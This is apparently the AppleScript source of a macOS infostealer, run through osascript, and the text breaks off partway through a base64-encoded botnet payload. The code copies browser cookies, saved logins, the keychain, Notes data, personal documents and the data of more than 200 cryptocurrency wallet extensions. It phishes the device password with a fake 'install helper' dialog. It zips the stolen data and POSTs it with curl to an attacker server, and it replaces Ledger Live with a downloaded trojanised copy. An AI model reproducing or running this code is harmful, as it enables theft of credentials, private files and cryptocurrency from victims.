osascript -e 'on mkdir(someItem)
	try
		set filePosixPath to quoted form of (POSIX path of someItem)
		do shell script "mkdir -p " & filePosixPath
	end try
end mkdir
on readfile(pather)
	try
		set theFile to POSIX file pather
		set fileContents to read theFile
		return fileContents
	end try
	return ""
end readfile
on FileName(filePath)
	try
		set reversedPath to (reverse of every character of filePath) as string
		set trimmedPath to text 1 thru ((offset of "/" in reversedPath) - 1) of reversedPath
		set finalPath to (reverse of every character of trimmedPath) as string
		return finalPath
	end try
	return ""
end FileName
on Directory(filePath)
	try
		set lastSlash to offset of "/" in (reverse of every character of filePath) as string
		set trimmedPath to text 1 thru -(lastSlash + 1) of filePath
		return trimmedPath
	end try
	return ""
end Directory
on writeText(textToWrite, filePath)
	try
		set folderPath to Directory(filePath)
		mkdir(folderPath)
		set fileRef to (open for access filePath with write permission)
		set eof of fileRef to 0
		write textToWrite to fileRef starting at eof
		close access fileRef
	end try
end writeText
on readwrite(path_to_file, path_as_save)
	try
		set fileContent to read path_to_file
		set folderPath to Directory(path_as_save)
		mkdir(folderPath)
		do shell script "cat " & quoted form of path_to_file & " > " & quoted form of path_as_save
	end try
end readwrite
on isDir(someItem)
	try
		set filePosixPath to quoted form of (POSIX path of someItem)
		set fileType to (do shell script "file -b " & filePosixPath)
		if fileType ends with "directory" then
			return true
		end if
	end try
	return false
end isDir
on GrabFolder(sourceFolder, destinationFolder)
	try
		set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews", "GPUCache", "DawnCache", "Crashpad", "DawnWebGPUCache", "DawnGraphiteCache", "__update__", "tor"}
		set fileList to list folder sourceFolder without invisibles
		mkdir(destinationFolder)
		repeat with currentItem in fileList
			if currentItem is not in exceptionsList then
				set itemPath to sourceFolder & "/" & currentItem
				set savePath to destinationFolder & "/" & currentItem
				if isDir(itemPath) then
					GrabFolder(itemPath, savePath)
				else
					readwrite(itemPath, savePath)
				end if
			end if
		end repeat
	end try
end GrabFolder
on GetUUID(pather, searchString)
	try
		set theFile to POSIX file pather
		set fileContents to read theFile
		set startPos to offset of searchString in fileContents
		if startPos is 0 then
			return "not found"
		end if
		set uuidStart to startPos + (length of searchString)
		set rawuuid to text uuidStart thru (uuidStart + 55) of fileContents
		set endpos to offset of "\\" in rawuuid
		if endpos is 0 then
			return "not found"
		end if
		set realuuid to text uuidStart thru (uuidStart + endpos - 2) of fileContents
		return realuuid
	on error
		return "not found"
	end try
end GetUUID
on firewallets(firepath, savePath)
	try
		set fire_wallets to {{"MetaMask", "webextension@metamask.io\\\":\\\""}}
		repeat with fire_wallet in fire_wallets
			set uuid to GetUUID(firepath & "/prefs.js", item 2 of fire_wallet)
			if uuid is not "not found" then
				set walkpath to firepath & "/storage/default/"
				set fileList to list folder walkpath without invisibles
				repeat with currentItem in fileList
					if (currentItem contains uuid) and (currentItem contains "userContext") then
						set fwallet to walkpath & currentItem & "/idb/"
						set walletFiles to list folder fwallet without invisibles
						repeat with currentWallet in walletFiles
							if isDir(fwallet & currentWallet) then
								GrabFolder(fwallet & currentWallet, savePath & "/" & item 1 of fire_wallet & "/")
							end if
						end repeat
					end if
				end repeat
			end if
		end repeat
	end try
end firewallets
on parseFF(browsername, firefox, writemind)
	try
		set myFiles to {"/cookies.sqlite", "/formhistory.sqlite", "/key4.db", "/logins.json"}
		set fileList to list folder firefox without invisibles
		repeat with currentItem in fileList
			set fpath to writemind & "gecko/" & browsername & "_" & currentItem
			firewallets(firefox & currentItem, fpath)
			set readpath to firefox & currentItem
			repeat with FFile in myFiles
				readwrite(readpath & FFile, fpath & FFile)
			end repeat
		end repeat
	end try
end parseFF
on checkvalid(username, password_entered)
	try
		set result to do shell script "dscl . authonly " & quoted form of username & space & quoted form of password_entered
		if result is not equal to "" then
			return false
		else
			return true
		end if
	on error
		return false
	end try
end checkvalid
on getpwd(username, writemind)
	try
		if checkvalid(username, "") then
			set result to do shell script "security 2>&1 > /dev/null find-generic-password -ga \"Chrome\" | awk \"{print $2}\""
			writeText(result as string, writemind & "masterpass-chrome")
		else
			repeat
				set result to display dialog "Required Application Helper. Please enter device password to continue." default answer "" with icon caution buttons {"Continue"} default button "Continue" giving up after 150 with title "Application wants to install helper" with hidden answer
				set password_entered to text returned of result
				if checkvalid(username, password_entered) then
					return password_entered
				end if
			end repeat
		end if
	end try
	return ""
end getpwd
on grabPlugins(paths, savePath, pluginList, index)
	try
		set fileList to list folder paths without invisibles
		repeat with PFile in fileList
			repeat with currentPlugin in pluginList
				if (PFile contains currentPlugin) then
					set newpath to paths & PFile
					set newsavepath to savePath & "/" & currentPlugin
					if index then
						set newsavepath to newsavepath & "/IndexedDB/"
					end if
					GrabFolder(newpath, newsavepath)
				end if
			end repeat
		end repeat
	end try
end grabPlugins
on chromium(writemind, chromium_map)
	set pluginList to {"ldinpeekobnhjjdofggfgjlcehhmanlj", "nphplpgoakhhjchkkhmiggakijnkhfnd", "jbkgjmpfammbgejcpedggoefddacbdia", "fccgmnglbhajioalokbcidhcaikhlcpm", "nebnhfamliijlghikdgcigoebonmoibm", "fdcnegogpncmfejlfnffnofpngdiejii", "mfhbebgoclkghebffdldpobeajmbecfk", "ffbceckpkpbcmgiaehlloocglmijnpmp", "kfdniefadaanbjodldohaedphafoffoh", "bedogdpgdnifilpgeianmmdabklhfkcn", "kpfchfdkjhcoekhdldggegebfakaaiog", "klnaejjgbibmhlephnhpmaofohgkpgkd", "opcgpfmipidbgpenhmajoajpbobppdil", "mmmjbcfofconkannjonfmjjajpllddbg", "modjfdjcodmehnpccdjngmdfajggaoeh", "dkdedlpgdmmkkfjabffeganieamfklkm", "ifclboecfhkjbpmhgehodcjpciihhmif", "ppbibelpcjmhbdihakflkdcoccbgbkpo", "ejjladinnckdgjemekebdpeokbikhfci", "kkpllkodjeloidieedojogacfhpaihoh", "apnehcjmnengpnmccpaibjmhhoadaico", "jiepnaheligkibgcjgjepjfppgbcghmp", "jojhfeoedkpkglbfimdfabpdfjaoolaf", "idpdilbfamoopcfofbipefhmmnflljfi", "lbjapbcmmceacocpimbpbidpgmlmoaao", "oiohdnannmknmdlddkdejbmplhbdcbee", "fldfpgipfncgndfolcbkdeeknbbbnhcc", "fpkhgmpbidmiogeglndfbkegfdlnajnf", "lgmpcpglpngdoalbgeoldeajfclnhafa", "ilhaljfiglknggcoegeknjghdgampffk", "pfccjkejcgoppjnllalolplgogenfojk", "cnmamaachppnkjgnildpdmkaakejnhae", "eajafomhmkipbjmfmhebemolkcicgfmd", "emeeapjkbcbpbpgaagfchmcgglmebnen", "ibnejdfjmmkpcnlpebklmnkoeoihofec", "hifafgmccdpekplomjjkcfgodnhcellj", "ffnbelfdoeiohenkjibnmadjiehjhajb", "fnjhmkhhmkbjkkabndcnnogagogbneec", "bcopgchhojmggmffilplmbdicgaihlkp", "cmoakldedjfnjofgbbfenefcagmedlga", "ifckdpamphokdglkkdomedpdegcjhjdp", "ibljocddagjghmlpgihahamcghfggcjc", "cjmkndjhnagcfbpiemnkdpomccnjblmj", "kbdcddcmgoplfockflacnnefaehaiocb", "cgeeodpfagjceefieflmdfphplkenlfk", "afbcbjpbpfadlkmhmclhkeeodmamcflc", "fdchdcpieegfofnofhgdombfckhbcokj", "gjlmehlldlphhljhpnlddaodbjjcchai", "ellkdbaphhldpeajbepobaecooaoafpg", "ojbcfhjmpigfobfclfflafhblgemeidi", "ghlmndacnhlaekppcllcpcjjjomjkjpg", "kgdijkcfiglijhaglibaidbipiejjfdp", "abkahkcbhngaebpcgfmhkoioedceoigp", "ammjlinfekkoockogfhdkgcohjlbhmff", "pdliaogehgdbhbnmkklieghmmjkpigpa", "jnlgamecbpmbajjfhmmmlhejkemejdma", "nbdhibgjnjpnkajaghbffjbkcgljfgdi", "jfdlamikmbghhapbgfoogdffldioobgl", "fijngjgcjhjmmpcmkeiomlglpeiijkld", "hgbeiipamcgbdjhfflifkgehomnmglgk", "pmmnimefaichbcnbndcfpaagbepnjaig", "cflgahhmjlmnjbikhakapcfkpbcmllam", "keenhcnmdmjjhincpilijphpiohdppno", "bipdhagncpgaccgdbddmbpcabgjikfkn", "bcenedbpaaegpnijoadpdjiachahncdg", "pocmplpaccanhmnllbbkpgfliimjljgo", "klghhnkeealcohjjanjjdaeeggmfmlpl", "cjookpbkjnpkmknedggeecikaponcalb", "ojggmchlghnjlapmfbnjholfjkiidbch", "dngmlblcodfobpdpecaadgfbcggfjfnm", "jnldfbidonfeldmalbflbmlebbipcnle", "ehjiblpccbknkgimiflboggcffmpphhp", "agoakfejjabomempkjlepdflaleeobhb", "fopmedgnkfpebgllppeddmmochcookhc", "dmkamcknogkgcdfhhbddcghachkejeap", "iglbgmakmggfkoidiagnhknlndljlolb", "opfgelmcmbiajamepnmloijbpoleiama", "gkeelndblnomfmjnophbhfhcjbcnemka", "dgiehkgfknklegdhekgeabnhgfjhbajd", "gafhhkghbfjjkeiendhlofajokpaflmk", "imlcamfeniaidioeflifonfjeeppblda", "penjlddjkjgpnkllboccdgccekpkcbin", "nhnkbkgjikgcigadomkphalanndcapjk", "egjidjbpglichdcondbcbdnbeeppgdph", "dlcobpjiigpikoobohmabehhmhfoodbb", "dldjpboieedgcmpkchcjcbijingjcgok", "acmacodkjbdgmoleebolmdjonilkdbch", "lccbohhgfkdikahanoclbdmaolidjdfl", "pcndjhkinnkaohffealmlmhaepkpmgkb", "gjagmgiddbbciopjhllkdnddhcglnemk", "cnncmdhjacpkmjmkcafchppbnpnhdmon", "mfgccjchihfkkindfppnaooecgfneiii", "ieldiilncjhfkalnemgjbffmpomcaigi", "ckklhkaabbmdjkahiaaplikpdddkenic", "loinekcabhlmhjjbocijdoimmejangoa", "mgffkfbidihjpoaomajlbgchddlicgpn", "pnndplcbkakcplkjnolgbkdgjikjednm", "mcohilncbfahbmgdjkbpemcciiolgcge", "bgpipimickeadkjlklgciifhnalhdjhe", "pdadjkfkgcafgbceimcpbkalnfnepbnk", "jiidiaalihmmhddjgbnbgdfflelocpak", "aeachknmefphepccionboohckonoeemg", "gdokollfhmnbfckbobkdbakhilldkhcj", "jiiigigdinhhgjflhljdkcelcjfmplnd", "kmphdnilpmdejikjdnlbcnmnabepfgkh", "jaooiolkmfcmloonphpiiogkfckgciom", "fcckkdbjnoikooededlapcalpionmalo", "mdnaglckomeedfbogeajfajofmfgpoae", "ebfidpplhabeedpnhjnobghokpiioolj", "dbgnhckhnppddckangcjbkjnlddbjkna", "cpmkedoipcpimgecpmgpldfpohjplkpp", "epapihdplajcdnnkdeiahlgigofloibg", "iokeahhehimjnekafflcihljlcjccdbe", "cihmoadaighcejopammfbmddcmdekcje", "hnfanknocfeofbddgcijnmhnfnkdnaad", "kilnpioakcdndlodeeceffgjdpojajlo", "abogmiocnneedmmepnohnhlijcjpcifd", "bofddndhbegljegmpmnlbhcejofmjgbn", "aholpfdialjgjfhomihkjbmgjidlcdno", "hdkobeeifhdplocklknbnejdelgagbao", "oafedfoadhdjjcipmcbecikgokpaphjk", "bfnaelmomeimhlpmgjnjophhpkkoljpa", "nkbihfbeogaeaoehlefnkodbefgpgknn", "lfmmjkfllhmfmkcobchabopkcefjkoip", "aiifbnbfobpmeekipheeijimdpnlpgpp", "anokgmphncpekkhclmingpimjmcooifb", "mnfifefkajgofkcjkemidiaecocnkjeh", "momakdpclmaphlamgjcndbgfckjfpemp", "akkmagafhjjjjclaejjomkeccmjhdkpa", "ehgjhhccekdedpbkifaojjaefeohnoea", "mkpegjkblkkefacfnmkajcjmabijhclg", "mlhakagmgkmonhdonhkpjeebfphligng", "niiaamnmgebpeejeemoifgdndgeaekhe", "jnmbobjmhlngoefaiojfljckilhhlhcj", "onhogfjeacnfoofkfgppdlbmlmnplgbn", "kppfdiipphfccemcignhifpjkapfbihd", "hcjhpkgbmechpabifbggldplacolbkoh", "flpiciilemghbmfalicajoolhkkenfel", "mlbnicldlpdimbjdcncnklfempedeipj", "cfbfdhimifdmdehjmkdobpcjfefblkjm", "ocjobpilfplciaddcbafabcegbilnbnb", "pgiaagfkgcbnmiiolekcfmljdagdhlcm", "enabgbdfcbaehmbigakijjabdpdnimlg", "bifidjkcdpgfnlbcjpdkdcnbiooooblg", "lnnnmfcpbkafcpgdilckhmhbkkbpkmid", "nlgbhdfgdhgbiamfdfmbikcdghidoadd", "fcfcfllfndlomdhbehjjcoimbgofdncg", "lpilbniiabackdjcionkobglmddfbcjo", "efbglgofoippbgcjepnhiblaibcnclgk", "fhbohimaelbohpjbbldcngcnapndodjp", "gkodhkbmiflnmkipcmlhhgadebbeijhh", "bocpokimicclpaiekenaeelehdjllofo", "bhhhlbepdkbapadjdnnojkbgioiodbic", "aflkmfhebedbjioipglgcbcmnbpgliof", "mkchoaaiifodcflmbaphdgeidocajadp", "mapbhaebnddapnmifbbkgeedkeplgjmf", "lmkncnlpeipongihbffpljgehamdebgi", "gjnckgkfmgmibbkoficdidcljeaaaheg", "ppdadbejkmjnefldpcdjhnkpbjkikoip", "bopcbmipnjdcdfflfgjdgdjejmgpoaab", "kamfleanhcmjelnhaeljonilnmjpkcjc", "cphhlgmgameodnhkjdmkpanlelnlohao", "hnhobjmcibchnmglfbldbfabcgaknlkj", "nknhiehlklippafakaeklbeglecifhad", "kjjebdkfeagdoogagbhepmbimaphnfln", "phkbamefinggmakgklpkljjmgibohnba", "lakggbcodlaclcbbbepmkpdhbcomcgkd", "ookjlbkiijinhpmnjffcofjonbfbgaoc", "mdjmfdffdcmnoblignmgpommbefadffd", "jblndlipeogpafnldhgmapagcccfchpi", "hbbgbephgojikajhfbomhlmmollphcad", "dpcklmdombjcplafheapiblogdlgjjlb", "hmeobnfnfcmdkdcmlblgagmfpfboieaf", "kmhcihpebfmpgmihbkipmjlmmioameka", "kennjipeijpeengjlogfdjkiiadhbmjl", "amkmjjmmflddogmhpjloimipbofnfjih", "idnnbdplmphpflfnlkomgpfbpcgelopg", "fmblappgoiilbgafhjklehhfifbdocee", "heamnjbnflcikcggoiplibfommfbkjpj", "khpkpbbcccdmmclmpigdgddabeilkdpd", "omaabbefbmiijedngplfjmnooppbclkk", "nhlnehondigmgckngjomcpcefcdplmgc", "fiikommddbeccaoicoejoniammnalkfa", "ejbidfepgijlcgahbmbckmnaljagjoll", "glmhbknppefdmpemdmjnjlinpbclokhn", "kncchdigobghenbbaddojjnnaogfppfj", "hpclkefagolihohboafpheddmmgdffjm", "ilolmnhjbbggkmopnemiphomhaojndmb", "panpgppehdchfphcigocleabcmcgfoca", "nngceckbapebfimnlniiiahkandclblb", "hdokiejnpimakedhajhdlcegeplioahd", "eiaeiblijfjekdanodkjadfinkhbfgcd", "bfogiafebfohielmmehodmfbbebbbpei", "pnlccmojcmeohlpggmfnbbiapkmbliob", "aeblfdkhhhdcdjpifhhbdiojplfjncoa", "kmcfomidfpdkfieipokbalgegidffkal", "fdjamakpfbbddfjaooikfcpapjohcfmg", "ghmbeldphafepmbegfdlkpapadhbakde", "cnlhokffphohmfcddnibpohmkdfafdli", "khhapgacijodhjokkcjmleaempmchlem", "admmjipmmciaobhojoghlmleefbicajg", "caljgklbbfbcjjanaijlacgncafpegll", "bdgmdoedahdcjmpmifafdhnffjinddgc"}
	set indexedPlugins to {"hnfanknocfeofbddgcijnmhnfnkdnaad", "mcohilncbfahbmgdjkbpemcciiolgcge", "aflkmfhebedbjioipglgcbcmnbpgliof", "enabgbdfcbaehmbigakijjabdpdnimlg", "cpmkedoipcpimgecpmgpldfpohjplkpp", "hdokiejnpimakedhajhdlcegeplioahd", "eiaeiblijfjekdanodkjadfinkhbfgcd", "cnlhokffphohmfcddnibpohmkdfafdli", "khhapgacijodhjokkcjmleaempmchlem", "hifafgmccdpekplomjjkcfgodnhcellj"}
	set chromiumFiles to {"/Network/Cookies", "/Cookies", "/Web Data", "/Login Data", "/Local Extension Settings/", "/IndexedDB/"}
	repeat with chromiumBrowser in chromium_map
		set savePath to writemind & "chromium/" & item 1 of chromiumBrowser & "_"
		try
			set fileList to list folder item 2 of chromiumBrowser without invisibles
			repeat with currentItem in fileList
				if ((currentItem as string) is equal to "Default") or ((currentItem as string) contains "Profile") then
					repeat with CFile in chromiumFiles
						set readpath to (item 2 of chromiumBrowser & currentItem & CFile)
						if ((CFile as string) is equal to "/Network/Cookies") then
							set CFile to "/Cookies"
						end if
						if ((CFile as string) is equal to "/Local Extension Settings/") then
							grabPlugins(readpath, savePath & currentItem, pluginList, false)
						else if (CFile as string) is equal to "/IndexedDB/" then
							grabPlugins(readpath, savePath & currentItem, indexedPlugins, true)
						else
							set writepath to savePath & currentItem & CFile
							readwrite(readpath, writepath)
						end if
					end repeat
				end if
			end repeat
		end try
	end repeat
end chromium
on filegrabber(writemind)
	try
		set destFolder to writemind & "finder/"
		set destinationFolderPath to POSIX file destFolder
		set notesMediaFolder to POSIX file (destFolder & "NotesMedia/")
		set extensionsList to {"txt", "pdf", "docx", "wallet", "key", "keys", "doc", "jpeg", "png", "kdbx", "rtf", "jpg"}
		set bankSize to 0
		set notesBankSize to 0
		set uuidString to do shell script "system_profiler SPHardwareDataType | awk \"/UUID/ { print $3 }\""
		mkdir(destinationFolderPath)
		mkdir(notesMediaFolder)
		tell application "Finder"
			try
				set safariFolderPath to (path to home folder as text) & "Library:Cookies:"
				duplicate file (safariFolderPath & "Cookies.binarycookies") to folder destinationFolderPath with replacing
				set name of result to "saf1"
			end try
			set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")
			try
				duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath with replacing
			end try
			set notesFolderPath to (path to home folder as text) & "Library:Group Containers:group.com.apple.notes:"
			try
				set notesFolder to folder notesFolderPath
				set notesFiles to {"NoteStore.sqlite", "NoteStore.sqlite-shm", "NoteStore.sqlite-wal"}
				repeat with aFile in notesFiles
					try
						duplicate (file aFile of notesFolder) to folder destinationFolderPath with replacing
					end try
				end repeat
			end try
			set notesAccountsPath to (notesFolderPath & "Accounts:")
			try
				set notesAccountsFolder to folder notesAccountsPath
				set notesAccountsFiles to every folder of notesAccountsFolder
				repeat with nFile in notesAccountsFiles
					set notesMediaPath to notesAccountsPath & name of nFile & ":Media:"
					set notesMediaAllProfiles to every folder of (folder notesMediaPath)
					repeat with profileFolder in notesMediaAllProfiles
						set notesMediaProfilesPath to notesMediaPath & name of profileFolder
						set notesMediaProfileFiles to every folder of (folder notesMediaProfilesPath)
						repeat with notesUUID in notesMediaProfileFiles
							set noteIdFiles to every file of notesUUID
							repeat with notesIdFile in noteIdFiles
								try
									set fileSize to size of notesIdFile as text
									set notesBankSize to notesBankSize + fileSize
									if notesBankSize < 12 * 1024 * 1024 then
										duplicate notesIdFile to notesMediaFolder with replacing
									else
										exit repeat
									end if
								end try
							end repeat
						end repeat
					end repeat
				end repeat
			end try
			try
				set safariFolderPath to (path to library folder from user domain as text) & "Safari:"
				duplicate (file "Form Values" of folder safariFolderPath) to destinationFolderPath with replacing
			end try
			try
				set keychainFolder to (path to library folder from user domain as text) & "Keychains:" & uuidString
				duplicate folder keychainFolder to destinationFolderPath with replacing
			end try
			try
				set desktopFiles to every file of desktop
				set documentsFiles to every file of folder "Documents" of (path to home folder)
				repeat with aFile in (desktopFiles & documentsFiles)
					set fileExtension to name extension of aFile
					if fileExtension is in extensionsList then
						set fileSize to size of aFile
						if (bankSize + fileSize) < 10 * 1024 * 1024 then
							try
								duplicate aFile to folder destinationFolderPath with replacing
								set bankSize to bankSize + fileSize
							end try
						else
							exit repeat
						end if
					end if
				end repeat
			end try
		end tell
	end try
end filegrabber
on send_data(attempt, outUsername, serverIP, isBot)
	try
		set result_send to (do shell script "curl -X POST -H \"buildid: 9c0139d779264053afd418a940d9dcc4\" -H \"username: " & outUsername & "\" -H \"repeat: " & isBot & "\" -H \"cid: \"  --data-binary @/tmp/out.zip http://" & serverIP & "/log")
	on error
		if attempt < 10 then
			delay 60
			send_data(attempt + 1, outUsername, serverIP)
		end if
	end try
end send_data
on ledger(pathToProfile, password_entered, serverIP)
	try
		set appPath to "/Applications/Ledger Live.app"
		list folder POSIX file appPath
		do shell script "curl http://" & serverIP & "/otherassets/ledger.zip -o /tmp/ledger.zip"
		try
			do shell script "pkill " & quoted form of "Ledger Live"
		end try
		do shell script "echo " & quoted form of password_entered & " | sudo -S rm -r " & quoted form of appPath
		delay 0.01
		do shell script "unzip /tmp/ledger.zip -d /Applications"
	end try
end ledger
on botnet_init(macUsername, pwd, serverIP)
	try
		set randomBotNumber to (random number from 10000 to 100000) as text
		set serviceName to "com." & randomBotNumber
		set mybotnetB64 to "b3Nhc2NyaXB0IC1lICdydW4gc2NyaXB0ICIiICYgcmV0dXJuICYgInNldCBhcHBfaWQgdG8gXCJ4eHhibHlhdFwiIiAmIHJldHVybiAmICJvbiBmMTk3MzI2OTA1MDEwODQxNTA0NyhwMTk0ODM5NjgzNDM0MzU2NTMwOCkiICYgcmV0dXJuICYgInNldCB2NTc5MTQ1ODQwMjU4MDI1NjA2NyB0byBcIlwiIiAmIHJldHVybiAmICJ0cnkiICYgcmV0dXJuICYgInNldCB2NTc5MTQ1ODQwMjU4MDI1NjA2NyB0byAoZG8gc2hlbGwgc2NyaXB0IFwiZWNobyBcXFwiXCIgJiBwMTk0ODM5NjgzNDM0MzU2NTMwOCAmIFwiXFxcIiB8IHhhcmdzXCIpIiAmIHJldHVybiAmICJlbmQgdHJ5IiAmIHJldHVybiAmICJyZXR1cm4gdjU3OTE0NTg0MDI1ODAyNTYwNjciICYgcmV0dXJuICYgImVuZCBmMTk3MzI2OTA1MDEwODQxNTA0NyIgJiByZXR1cm4gJiAib24gZjgwNjM3NjgwOTA2MjQ4MjEyNjUocDEyNjYzOTU3OTA5MDgxNTA3NzEpIiAmIHJldHVybiAmICJ0cnkiICYgcmV0dXJuICYgInNldCB2ODI1NjE0NDA2NDY4MjA4NDY5OSB0byByZWFkIHAxMjY2Mzk1NzkwOTA4MTUwNzcxIiAmIHJldHVybiAmICJyZXR1cm4gdjgyNTYxNDQwNjQ2ODIwODQ2OTkiICYgcmV0dXJuICYgImVuZCB0cnkiICYgcmV0dXJuICYgInJldHVybiBcIlwiIiAmIHJldHVybiAmICJlbmQgZjgwNjM3NjgwOTA2MjQ4MjEyNjUiICYgcmV0dXJuICYgIm9uIGY1NTY5MTQyNzg4NzQ0MDE2OTk3KHA4MTQyODYzNTg5MjM1NTEzMDAxLCBwOTAwMjU2OTAxNDMyMDYyNjUxMikiICYgcmV0dXJuICYgInRyeSIgJiByZXR1cm4gJiAic2V0IHY2MzA0NjIyODMyMTE4NDYwMjY3IHRvIChvcGVuIGZvciBhY2Nlc3MgcDgxNDI4NjM1ODkyMzU1MTMwMDEgd2l0aCB3cml0ZSBwZXJtaXNzaW9uKSIgJiByZXR1cm4gJiAic2V0IGVvZiBvZiB2NjMwNDYyMjgzMjExODQ2MDI2NyB0byAwIiAmIHJldHVybiAmICJ3cml0ZSBwOTAwMjU2OTAxNDMyMDYyNjUxMiB0byB2NjMwNDYyMjgzMjExODQ2MDI2NyBzdGFydGluZyBhdCBlb2YiICYgcmV0dXJuICYgImNsb3NlIGFjY2VzcyB2NjMwNDYyMjgzMjExODQ2MDI2NyIgJiByZXR1cm4gJiAiZW5kIHRyeSIgJiByZXR1cm4gJiAiZW5kIGY1NTY5MTQyNzg4NzQ0MDE2OTk3IiAmIHJldHVybiAmICJvbiBmMzY2NzAxOTE5MTUwMzM2NzgzMChwODAxMzAxNTIxOTI0NDk3MDU4MSkiICYgcmV0dXJuICYgInRyeSIgJiByZXR1cm4gJiAic2V0IHY1ODUwMTg3MzU5OTM3MDkxNjQ0IHRvIGRvIHNoZWxsIHNjcmlwdCBcInBncmVwIC1mIFwiICYgcXVvdGVkIGZvcm0gb2YgcDgwMTMwMTUyMTkyNDQ5NzA1ODEiICYgcmV0dXJuICYgImlmIHY1ODUwMTg3MzU5OTM3MDkxNjQ0IGlzIG5vdCBlcXVhbCB0byBcIlwiIHRoZW4iICYgcmV0dXJuICYgInJldHVybiB0cnVlIiAmIHJldHVybiAmICJlbmQgaWYiICYgcmV0dXJuICYgImVuZCB0cnkiICYgcmV0dXJuICYgInJldHVybiBmYWxzZSIgJiByZXR1cm4gJiAiZW5kIGYzNjY3MDE5MTkxNTAzMzY3ODMwIiAmIHJldHVybiAmICJvbiBmNjA3MjE3NzM0MDIwODIzNzI1NShwMzIxMTY2NjU3MDgyODQxMzcyMCwgcDMxMzI5NzczMDU0NDM3MzU2MTUsIHA2MTk5MDkwMjY5Mzk2NDgwNTk5LCBwMjcyOTI5NTMzODQ3MDEyNzM1OCkiICYgcmV0dXJuICYgImlmIHAyNzI5Mjk1MzM4NDcwMTI3MzU4ID4gMTAgdGhlbiIgJiByZXR1cm4gJiAicmV0dXJuIFwibm90XCIiICYgcmV0dXJuICYgImVuZCBpZiIgJiByZXR1cm4gJiAidHJ5IiAmIHJldHVybiAmICJzZXQgdjYyOTA4MzUwODk2MzYxMjU1MjIgdG8gXCJodHRwOi8vXCIgJiBwMzIxMTY2NjU3MDgyODQxMzcyMCAmIFwiL2FwaS92MS9ib3Qvam9pbnN5c3RlbS9cIiAmIHAzMTMyOTc3MzA1NDQzNzM1NjE1ICYgXCIvXCIgJiBwNjE5OTA5MDI2OTM5NjQ4MDU5OSIgJiByZXR1cm4gJiAic2V0IHYzNTAwOTIyNTIwMDAxNjY0NjI3IHRvIGRvIHNoZWxsIHNjcmlwdCBcImN1cmwgLXMgXCIgJiBxdW90ZWQgZm9ybSBvZiB2NjI5MDgzNTA4OTYzNjEyNTUyMiIgJiByZXR1cm4gJiAicmV0dXJuIHYzNTAwOTIyNTIwMDAxNjY0NjI3IiAmIHJldHVybiAmICJvbiBlcnJvciBFcnJNc2ciICYgcmV0dXJuICYgImRlbGF5IDYwIiAmIHJldHVybiAmICJyZXR1cm4gZjYwNzIxNzczNDAyMDgyMzcyNTUocDMyMTE2NjY1NzA4Mjg0MTM3MjAsIHAzMTMyOTc3MzA1NDQzNzM1NjE1LCBwMjcyOTI5NTMzODQ3MDEyNzM1OCArIDEpIiAmIHJldHVybiAmICJlbmQgdHJ5IiAmIHJldHVybiAmICJyZXR1cm4gXCJub3RcIiIgJiByZXR1cm4gJiAiZW5kIGY2MDcyMTc3MzQwMjA4MjM3MjU1IiAmIHJldHVybiAmICJvbiBmMzg1MjYwOTE0ODc3MDE5NDgyMShwNTg1NzUyNzkwMDAzNjg5MTI3NSwgcDU0OTM0NDA4OTEwMDU2NzMyNjUsIHA4ODQ2ODk5MTA4MDM3NjcxMzc4KSIgJiByZXR1cm4gJiAiaWYgcDg4NDY4OTkxMDgwMzc2NzEzNzggPiAxMCB0aGVuIiAmIHJldHVybiAmICJyZXR1cm4gXCJub3RcIiIgJiByZXR1cm4gJiAiZW5kIGlmIiAmIHJldHVybiAmICJ0cnkiICYgcmV0dXJuICYgInNldCB2NTYzODI0NTk2ODEyNzE2MDIzMyB0byBcImh0dHA6Ly9cIiAmIHA1ODU3NTI3OTAwMDM2ODkxMjc1ICYgXCIvYXBpL3YxL2JvdC9hY3Rpb25zL1wiICYgcDU0OTM0NDA4OTEwMDU2NzMyNjUiICYgcmV0dXJuICYgInNldCB2NjUwMjYwNTYyNzc5MDcwMzgyMiB0byBkbyBzaGVsbCBzY3JpcHQgXCJjdXJsIC1zIFwiICYgcXVvdGVkIGZvcm0gb2YgdjU2MzgyNDU5NjgxMjcxNjAyMzMiICYgcmV0dXJuICYgInNldCB2NjIxOTA5MjkyMDkwMjM3NzgyOSB0byBwYXJhZ3JhcGhzIG9mIHY2NTAyNjA1NjI3NzkwNzAzODIyIiAmIHJldHVybiAmICJpZiAobGVuZ3RoIG9mIHY2MjE5MDkyOTIwOTAyMzc3ODI5KSBpcyBub3QgZXF1YWwgdG8gMyB0aGVuIiAmIHJldHVybiAmICJkZWxheSA2MCIgJiByZXR1cm4gJiAicmV0dXJuIGYzODUyNjA5MTQ4NzcwMTk0ODIxKHA1ODU3NTI3OTAwMDM2ODkxMjc1LCBwNTQ5MzQ0MDg5MTAwNTY3MzI2NSwgcDg4NDY4OTkxMDgwMzc2NzEzNzggKyAxKSIgJiByZXR1cm4gJiAiZW5kIGlmIiAmIHJldHVybiAmICJyZXR1cm4gdjYyMTkwOTI5MjA5MDIzNzc4MjkiICYgcmV0dXJuICYgIm9uIGVycm9yIiAmIHJldHVybiAmICJkZWxheSA2MCIgJiByZXR1cm4gJiAicmV0dXJuIGYzODUyNjA5MTQ4NzcwMTk0ODIxKHA1ODU3NTI3OTAwMDM2ODkxMjc1LCBwNTQ5MzQ0MDg5MTAwNTY3MzI2NSwgcDg4NDY4OTkxMDgwMzc2NzEzNzggKyAxKSIgJiByZXR1cm4gJiAiZW5kIHRyeSIgJiByZXR1cm4gJiAicmV0dXJuIFwibm90XCIiICYgcmV0dXJuICYgImVuZCBmMzg1MjYwOTE0ODc3MDE5NDgyMSIgJiByZXR1cm4gJiAib24gZjUzMTMxMzc5MjY3NDM1MDg1MjEocDQ5NTc3NDgzNTgwNjkxOTczMzkpIiAmIHJldHVybiAmICJmNTU2OTE0Mjc4ODc0NDAxNjk5NyhwNDk1Nzc0ODM1ODA2OTE5NzMzOSAmIFwiLy51bmluc3RhbGxlZFwiLCBcIitcIikiICYgcmV0dXJuICYgImRvIHNoZWxsIHNjcmlwdCBcImV4aXQgMFwiIiAmIHJldHVybiAmICJlbmQgZjUzMTMxMzc5MjY3NDM1MDg1MjEiICYgcmV0dXJuICYgIm9uIGY4OTY3OTE1MTA3OTc5MjM3MDg1KHAyMzE2NDU1MTgxMzUyMDg4MzE5KSIgJiByZXR1cm4gJiAiaWYgZjM2NjcwMTkxOTE1MDMzNjc4MzAocDIzMT